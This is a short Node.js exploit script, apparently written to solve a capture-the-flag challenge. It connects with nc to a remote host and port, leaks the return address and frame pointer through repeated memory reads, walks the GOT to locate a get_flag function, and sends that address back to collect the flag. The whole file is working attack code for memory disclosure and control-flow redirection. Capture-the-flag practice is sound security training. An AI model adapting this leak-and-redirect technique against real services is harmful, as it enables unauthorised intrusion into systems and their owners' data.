const readline = require("readline");
const {spawn} = require("child_process");

let rbp = null, retaddr = null;
let index = null;

let times = 0; // number of times we have seen 0x3d48--the first occurrence is not the real GOT
let times2 = 0; // our current offset within GOT

//const nc = spawn("./a.out");
const nc = spawn("nc", ["184.72.87.9", "8005"]);
const rl = readline.createInterface({input: nc.stdout});

// read retaddr and RBP
nc.stdin.write("168\n160\n\n");

rl.on("line", line => {

    const match = line.match(/like (.+)$/);
    if(match) {
        const value = BigInt('0x' + match[1].split(" ").reverse().join(""));
        if(!retaddr) {
            retaddr = value & 0xfffffffffffffff8n; // align to 8 bytes
        } else if(!rbp) {
            rbp = value;
            index = retaddr - rbp;
        } else {
            if(times == 2) {
                times2++;
                if(times2 == 19) {
                    nc.stdin.write('get_flag is at 0x'+value.toString(16)+'\n');
                }
            }
            if(value == 0x3d48n) {
                times++;
            }
        }
        if(index) {
            nc.stdin.write(index + '\n');
            index += 8n;
        }
    } else if(line.includes("the flag is")) {
        console.log(line);
    }

});